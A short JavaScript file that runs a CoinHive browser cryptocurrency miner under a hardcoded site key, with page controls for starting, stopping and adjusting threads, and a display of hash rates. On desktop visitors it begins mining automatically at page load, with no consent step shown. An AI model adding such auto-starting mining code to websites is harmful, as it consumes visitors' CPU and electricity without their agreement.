var miner = new
CoinHive.Anonymous('tFhpGwfJEH5YkSVG1VtPYK9Tpv0a0pNj');
var isStarted = false;
var threads = 2;
var timer;
document.getElementById("threads").innerHTML= threads;

if (!miner.isMobile()) {
    start();
}

document.getElementById("addThread").addEventListener("click", addThread);
document.getElementById("removeThread").addEventListener("click", removeThread);
function start(){
  if(isStarted == false && !miner.isMobile()){
    miner.start();
    isStarted = true;
    timer = setInterval(getData, 100);

    update("toggle","Stop");
  }else{
    miner.stop();
    var  v1 = miner.getHashesPerSecond();
    isStarted = false;
    clearInterval(timer);
    update("hashes",v1);
    update("toggle","Start");
  }
}


document.getElementById("toggle").addEventListener("click", start);

function addThread(){
  
    threads++;
    miner.setNumThreads(threads);
    update("threads",threads);

}

function removeThread(){
  if(threads>=2 )
    threads--;
  miner.setNumThreads(threads);
  update("threads",threads);
}



function update(element,variable){
  document.getElementById(element).innerHTML = variable;
}


document.getElementById("addThread").addEventListener("click", addThread);
document.getElementById("removeThread").addEventListener("click", removeThread);



function getData(){
  var  v1 = miner.getHashesPerSecond();
  var v2 = miner.getTotalHashes();
  v1 = Math.round(v1);
  update("hashes",v1);
  update("total",v2);
  update("threads",threads);
}
